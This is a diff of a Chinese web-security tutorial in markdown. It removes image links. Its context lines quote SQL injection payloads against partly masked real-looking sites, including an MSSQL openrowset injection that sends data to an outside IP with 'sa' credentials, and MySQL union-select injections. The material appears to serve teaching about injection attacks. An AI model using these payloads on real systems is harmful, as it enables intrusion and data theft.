@@ -2019,7 +2019,6 @@ Server 头域包含处理请求的原始服务器的软件信息、Web 服务器
 
 开始 --> 运行 --> cmd --> telnet，打开 telnet，输入 `set localecho`，打开 telnet 回显功能，如图 2 所示。
 
-![](img/570f1beedc971b43bae0a626f1f96e78_51_0.png)
 
 #### 2.2 发送请求得到回显
 
@@ -4479,7 +4478,6 @@ private void button_check_Click(object sender, EventArgs e)
 
 图21 综合检测工具编写流程
 
-![](img/570f1beedc971b43bae0a626f1f96e78_106_1.png)
 
 图22 综合检测工具运行结果1
 
@@ -5502,7 +5500,6 @@ MSSQL 有很多的内置变量，我们可以利用这些内置的变量来获�
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_136_0.png)
 
-![](img/570f1beedc971b43bae0a626f1f96e78_136_1.png)
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_136_2.png)
 
@@ -7376,7 +7373,6 @@ http://210.xx.xx.190/bbs/content_news.aspx?forum_id=10002&title_id=4397; insert 
 
 返回结果图66所示。
 
-![](img/570f1beedc971b43bae0a626f1f96e78_182_1.png)
 
 ```text
 http://210.xx.xx.190/bbs/content_news.aspx?forum_id=10002&title_id=4397; insert into openrowset('sqloledb','124.78.165.151';'sa';'123456','select * from dirtree') select * from tmp;--
@@ -8981,7 +8977,6 @@ MYSQL 有很多的内置函数，经常使用 DATABASE()、USER()、SYSTEM_USER(
 
 然后利用 union 查询返回信息的显示字段，提交 `http://zcni.xxx.cn/info.php?id=295 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11/*`，返回结果如图6所示。
 
-![](img/570f1beedc971b43bae0a626f1f96e78_222_2.png)
 
 我们把 union 后面的 6 换成 MYSQL 的内置函数 user()，提交 `http://zcni.xxx.cn/info.php?id=295 and 1=2 union select 1,2,3,4,5,user(),7,8,9,10,11/*`，返回结果如图7所示。
 
